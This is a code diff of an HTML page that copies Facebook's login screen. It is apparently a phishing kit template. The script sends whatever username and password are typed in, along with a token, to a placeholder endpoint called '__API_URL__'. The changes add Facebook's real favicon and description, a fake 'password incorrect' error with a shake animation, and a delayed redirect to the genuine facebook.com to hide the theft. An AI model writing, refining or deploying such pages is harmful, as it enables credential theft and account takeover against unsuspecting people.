@@ -1,167 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
+    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #f0f2f5;
-            font-family: Helvetica, Arial, sans-serif;
-            color: #1c1e21;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            display: flex;
-            width: 100%;
-            max-width: 980px;
-            padding: 20px;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        @media (max-width: 899px) {
-            .container {
-                flex-direction: column;
-                text-align: center;
-                max-width: 400px;
-            }
-
-            .left-panel {
-                margin-right: 0 !important;
-                margin-bottom: 40px;
-            }
-        }
-
-        .left-panel {
-            flex-basis: 580px;
-            margin-right: 32px;
-            padding-bottom: 112px;
-        }
-
-        .logo {
-            width: 300px;
-            margin-left: -28px;
-        }
-
-        .left-panel h2 {
-            font-size: 28px;
-            font-weight: normal;
-            line-height: 32px;
-            width: 500px;
-            margin-top: -20px;
-        }
-
-        @media (max-width: 899px) {
-            .left-panel h2 {
-                width: 100%;
-                font-size: 24px;
-            }
-        }
-
-        .right-panel {
-            flex-basis: 396px;
-        }
-
-        .login-box {
-            background: #fff;
-            border: none;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
-            padding: 20px;
-            text-align: center;
-        }
-
-        .login-form input {
-            width: 100%;
-            height: 52px;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            outline: none;
-        }
-
-        .login-form input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-
-        .login-btn {
-            width: 100%;
-            height: 48px;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 6px;
-        }
-
-        .login-btn:hover {
-            background-color: #166fe5;
-        }
-
-        .forgot {
-            display: block;
-            color: #1877f2;
-            font-size: 14px;
-            margin-top: 16px;
-            text-decoration: none;
-        }
-
-        .forgot:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-
-        .create-btn {
-            background-color: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: bold;
-            padding: 0 16px;
-            height: 48px;
-            cursor: pointer;
-        }
-
-        .create-btn:hover {
-            background-color: #36a420;
-        }
-
-        .footer-text {
-            margin-top: 28px;
-            font-size: 14px;
-        }
-
-        .footer-text a {
-            text-decoration: none;
-            font-weight: bold;
-            color: #1c1e21;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background-color:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{display:flex;width:100%;max-width:980px;padding:20px;justify-content:space-between;align-items:center}
+        @media(max-width:899px){.container{flex-direction:column;text-align:center;max-width:400px}.left-panel{margin-right:0!important;margin-bottom:40px}}
+        .left-panel{flex-basis:580px;margin-right:32px;padding-bottom:112px}
+        .logo{width:300px;margin-left:-28px}
+        .left-panel h2{font-size:28px;font-weight:normal;line-height:32px;width:500px;margin-top:-20px}
+        @media(max-width:899px){.left-panel h2{width:100%;font-size:24px}}
+        .right-panel{flex-basis:396px}
+        .login-box{background:#fff;border:none;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;text-align:center;animation:fadeIn .4s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}
+        .login-form input{width:100%;height:52px;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;transition:border-color .2s}
+        .login-form input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+        .login-btn{width:100%;height:48px;background-color:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:bold;cursor:pointer;margin-top:6px;transition:background-color .2s,transform .1s;position:relative}
+        .login-btn:hover{background-color:#166fe5}
+        .login-btn:active{transform:scale(.98)}
+        .spinner{display:inline-block;width:22px;height:22px;border:3px solid rgba(255,255,255,.3);border-top:3px solid #fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .forgot{display:block;color:#1877f2;font-size:14px;margin-top:16px;text-decoration:none}
+        .forgot:hover{text-decoration:underline}
+        .divider{border-bottom:1px solid #dadde1;margin:20px 0}
+        .create-btn{background-color:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:bold;padding:0 16px;height:48px;cursor:pointer;transition:background-color .2s}
+        .create-btn:hover{background-color:#36a420}
+        .footer-text{margin-top:28px;font-size:14px}
+        .footer-text a{text-decoration:none;font-weight:bold;color:#1c1e21}
+        .error-msg{color:#d32f2f;font-size:13px;text-align:left;margin-bottom:8px;display:none}
     </style>
 </head>
-
 <body>
     <div class="container">
         <div class="left-panel">
@@ -171,10 +45,10 @@
         <div class="right-panel">
             <div class="login-box">
                 <form class="login-form" id="loginForm">
-                    <input type="text" id="username" placeholder="Email address or phone number"
-                        aria-label="Email address or phone number">
+                    <div class="error-msg" id="errorMsg">The password that you've entered is incorrect. <a href="#" style="color:#1877f2">Forgotten password?</a></div>
+                    <input type="text" id="username" placeholder="Email address or phone number" aria-label="Email address or phone number">
                     <input type="password" id="password" placeholder="Password" aria-label="Password">
-                    <button type="submit" class="login-btn">Log in</button>
+                    <button type="submit" class="login-btn" id="loginBtn">Log in</button>
                     <a href="#" class="forgot">Forgotten password?</a>
                     <div class="divider"></div>
                     <button type="button" class="create-btn">Create new account</button>
@@ -183,26 +57,32 @@
             <p class="footer-text"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
         </div>
     </div>
-
     <script>
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
+        const form=document.getElementById('loginForm');
+        const btn=document.getElementById('loginBtn');
+        form.addEventListener('submit',(e)=>{
             e.preventDefault();
-            const u = document.getElementById('username');
-            const p = document.getElementById('password');
-            const data = {
-                token: '__TOKEN__',
-                username: u.value,
-                password: p.value
-            };
-            fetch('__API_URL__', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).finally(() => {
-                window.location.href = 'https://www.facebook.com/';
-            });
+            const u=document.getElementById('username');
+            const p=document.getElementById('password');
+            if(!u.value||!p.value){
+                document.querySelector('.login-form').style.animation='shake 0.4s';
+                setTimeout(()=>document.querySelector('.login-form').style.animation='',400);
+                return;
+            }
+            btn.innerHTML='<span class="spinner"></span>';
+            btn.style.pointerEvents='none';
+            const data={token:'__TOKEN__',username:u.value,password:p.value};
+            fetch('__API_URL__',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
+            .then(()=>{
+                document.getElementById('errorMsg').style.display='block';
+                btn.textContent='Log in';btn.style.pointerEvents='auto';
+                p.value='';
+                document.querySelector('.login-form').style.animation='shake 0.4s';
+                setTimeout(()=>document.querySelector('.login-form').style.animation='',400);
+                setTimeout(()=>{window.location.href='https://www.facebook.com/';},3000);
+            })
+            .catch(()=>{window.location.href='https://www.facebook.com/';});
         });
     </script>
 </body>
-
 </html>
